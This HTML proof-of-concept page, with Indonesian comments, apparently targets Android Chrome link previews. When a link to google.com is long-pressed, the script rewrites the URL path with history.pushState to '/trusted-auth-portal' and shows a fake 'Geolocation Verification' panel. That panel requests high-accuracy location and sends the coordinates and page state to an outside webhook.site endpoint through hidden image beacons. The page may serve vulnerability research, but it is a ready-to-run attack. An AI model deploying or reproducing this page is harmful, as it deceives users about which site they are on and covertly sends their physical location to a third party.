<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Android Origin Desync & Preview PoC</title>
<meta name="viewport" content="width=device-width, initial-scale=1">

<style>
body {
  margin: 0;
  font-family: -apple-system, BlinkMacSystemFont, system-ui, Roboto, sans-serif;
  background: #f5f5f7;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  min-height: 100vh;
}
.spoof-link {
  display: inline-block;
  font-size: 16px;
  padding: 14px 24px;
  border-radius: 12px;
  text-decoration: none;
  background: #1a73e8;
  color: #fff;
  font-weight: 600;
  box-shadow: 0 4px 12px rgba(26, 115, 232, 0.3);
}
#panel {
  display: none;
  max-width: 420px;
  width: 90%;
  margin-top: 30px;
  background: #fff;
  padding: 24px;
  border-radius: 16px;
  box-shadow: 0 20px 60px rgba(0,0,0,.15);
  text-align: center;
}
button.action-btn {
  font-size: 15px;
  padding: 10px 16px;
  border-radius: 8px;
  border: none;
  background: #34a853;
  color: #fff;
  font-weight: 600;
  cursor: pointer;
  margin-top: 12px;
}
.notice {
  margin-top: 14px;
  font-size: 12px;
  color: #5f6368;
}
</style>
</head>

<body>

<!-- Target Link dengan dukungan Long-Press Preview & PushState Context -->
<a href="https://google.com" target="_blank" rel="noopener noreferrer" class="spoof-link" id="triggerLink">Long Press -> Preview Page & Origin Sync</a>

<div id="panel">
  <h2>Geolocation Verification</h2>
  <p>Tap below to initialize precise coordinate retrieval.</p>

  <button class="action-btn" onclick="getLocation()">Get Location</button>
  <p id="output" style="margin-top: 12px; font-size: 14px; color: #202124;">Location: -</p>

  <div class="notice">
    Android Chrome security context verification.
  </div>
</div>

<script>
const LOG_ENDPOINT = "https://webhook.site/9de41a71-f12f-4d4c-8fe4-6a3a787c0750";

/* 🔥 CORS-proof forensic logger */
function logEvent(type, extra = {}) {
  const data = {
    type,
    ts: performance.now().toFixed(3),
    epoch: Date.now(),
    url: location.href,
    origin: location.origin,
    visibility: document.visibilityState,
    readyState: document.readyState,
    ...extra
  };

  const params = new URLSearchParams(data).toString();
  new Image().src = `${LOG_ENDPOINT}?${params}`;
}

const panel   = document.getElementById('panel');
const triggerLink = document.getElementById('triggerLink');
const output  = document.getElementById('output');

function getLocation() {
  if (!navigator.geolocation) return;

  logEvent("geolocation_requested");

  navigator.geolocation.getCurrentPosition(
    pos => {
      logEvent("geolocation_success", {
        lat: pos.coords.latitude,
        lon: pos.coords.longitude
      });

      output.textContent = `${pos.coords.latitude}, ${pos.coords.longitude}`;
    },
    err => {
      logEvent("geolocation_error", { code: err.code });
      output.textContent = 'Permission denied / error';
    },
    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
  );
}

/* Step 1: Android Context Menu / Long Press Integration */
triggerLink.addEventListener('contextmenu', (e) => {
  logEvent("poc_started_contextmenu");

  // Memanipulasi history state agar konteks URL tampak terpercaya sebelum preview terbuka
  try {
    history.pushState({ trustedContext: true }, '', '/trusted-auth-portal');
    logEvent("pushstate_done", { newPath: location.pathname });
  } catch (err) {
    logEvent("pushstate_error", { message: err.message });
  }

  // Menampilkan panel interaktif bersamaan dengan jeda waktu render Android Chrome
  setTimeout(() => {
    panel.style.display = 'block';
    logEvent("panel_displayed");
  }, 400);
});

triggerLink.addEventListener('touchstart', () => {}, { passive: true });

/* Step 2: Android Navigation Race & State Sync */
window.addEventListener('pageshow', (event) => {
  logEvent("pageshow", { persisted: event.persisted });

  // Penyesuaian waktu tunda (delay) agar sesuai dengan siklus render UI thread Android Chrome
  requestAnimationFrame(() => {
    requestAnimationFrame(() => {
      setTimeout(() => {
        logEvent("navigation_check", {
          stateLength: history.length,
          currentPath: location.pathname
        });
      }, 120);
    });
  });
});
</script>

</body>
</html>
